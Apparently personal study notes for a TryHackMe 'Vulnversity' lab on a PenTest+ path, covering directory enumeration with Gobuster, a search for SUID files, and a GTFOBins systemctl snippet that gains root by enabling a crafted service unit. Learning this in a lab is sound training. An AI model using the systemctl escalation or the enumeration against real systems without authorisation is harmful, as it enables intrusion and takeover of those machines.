## PATH : Comptia pentest+

## [Vulnersity](https://tryhackme.com/room/vulnversity)

1. Ports Scan

2. Gobuster : 
It is a tool which helps to discover any public directory available on the target

    To get started, you will need a wordlist for Gobuster (which will be used to quickly go through the wordlist to identify if a public directory is available). If you are using Kali Linux, you can find many wordlists under `/usr/share/wordlists`. You can also use the wordlist for directories located at /`usr/share/wordlists/dirbuster/directory-list-1.0.txt` in the AttackBox.

    Now let's run Gobuster with a wordlist using `gobuster dir -u http://10.10.248.204:3333 -w <word list location>`

    Gobuster flag	Description
    - e	: Print the full URLs in your console
    - u	: The target URL
    - w	: Path to your wordlist
    - U : and -P	Username and Password for Basic Auth
    - p : "x"	Proxy to use for requests
    - c : "http cookies"	Specify a cookie for simulating your auth

4. Privelege EScalation

    On the system, search for all SUID files. Which file stands out?
    Use the command: `find / -user root -perm -4000 -exec ls -ldb {} \;`
    or `find / -perm /4000 2> /dev/null`

Search for systemctl on this link https://gtfobins.github.io/gtfobins/systemctl/
THen change /systemctl to /bin/systemctl after that execute the script


TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF